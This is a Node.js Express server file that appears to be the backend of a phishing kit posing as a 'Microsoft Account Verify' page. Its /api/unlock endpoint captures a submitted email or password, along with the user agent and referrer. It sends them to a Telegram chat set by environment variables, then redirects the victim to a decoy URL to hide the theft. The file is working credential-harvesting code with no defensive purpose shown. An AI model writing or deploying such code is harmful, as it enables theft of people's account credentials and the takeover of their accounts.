// server.js
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 10000;

app.use(express.json());
app.use(express.static(__dirname));

// Add as many URLs as you want here. The script will pick one at random.
// These links are NEVER sent to the browser until the form is successfully submitted.
const REDIRECT_URLS = [
  "https://x.com/",
  "https://x.com"
];

app.post('/api/unlock', async (req, res) => {
  try {
    // 1. Capture the email (and fallback to password just in case)
    const { email, password, userAgent, referrer } = req.body;
    const submittedValue = email || password || 'No input provided';

    console.log('Received verify request. Value provided:', submittedValue);

    // 2. Get Telegram credentials from environment variables
    const token = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!token || !chatId) {
      console.error("Missing Telegram environment variables");
      return res.status(500).json({ 
        success: false, 
        error: "Server configuration error" 
      });
    }

    const now = new Date().toLocaleString('en-US', { 
      timeZone: 'America/New_York',
      year: 'numeric', 
      month: 'short', 
      day: 'numeric',
      hour: '2-digit', 
      minute: '2-digit', 
      second: '2-digit'
    });

    // 3. Format the message for Telegram
    const message = 
      `SUCCESSFUL VERIFICATION\n` +
      `Page: Microsoft Account Verify\n` +
      `Time: ${now}\n` +
      `User Agent: ${userAgent || 'unknown'}\n` +
      `Referrer: ${referrer || 'direct'}\n` +
      `Captured Email/Value: ${submittedValue}\n` +
      `Client accessed the verification page.`;

    // 4. Send the notification to Telegram
    try {
      const response = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
        chat_id: chatId,
        text: message
      });
      console.log('✅ Telegram notification sent successfully');
    } catch (telegramError) {
      if (telegramError.response) {
        console.error('❌ Telegram Error Status:', telegramError.response.status);
        console.error('❌ Telegram Error Data:', JSON.stringify(telegramError.response.data));
      } else {
        console.error('❌ Telegram Error:', telegramError.message);
      }
    }

    // 5. Pick a random URL and send it to the client to redirect them
    const randomUrl = REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];

    res.json({ 
      success: true, 
      redirectUrl: randomUrl 
    });

  } catch (error) {
    console.error('Server error:', error);
    res.status(500).json({ 
      success: false, 
      error: "Failed to process request" 
    });
  }
});

app.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
});
